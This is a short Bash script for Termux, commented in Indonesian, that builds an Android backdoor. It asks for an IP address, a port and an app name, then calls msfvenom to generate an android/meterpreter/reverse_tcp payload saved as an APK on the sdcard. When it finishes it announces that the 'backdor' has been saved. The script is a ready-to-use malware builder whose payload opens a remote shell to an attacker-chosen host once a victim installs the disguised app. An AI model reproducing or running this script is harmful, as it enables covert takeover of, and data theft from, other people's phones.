#gausah di recode gan , pelajari aja
#!/bin/bash
clear
termux-setup-storage
apt install figlet -y
clear
echo -e "\e[1;34m"
figlet -f standard "LimitQ"
echo -e "\e[1;30m"
read -p "Masukan alamat ip : " pi
read -p "Masukan port yang di pilih: " pil
read -p "Masukan nama aplikasi tanpa (.apk) : " pili

msfvenom -p android/meterpreter/reverse_tcp lhost=$pi lport=$pil -o /sdcard/$pili.apk


echo ""
echo -e "\e[1;32mBackdor sudah tersimpan di sdcard/ penyimpanan anda"
echo "\3[0m"
echo ""
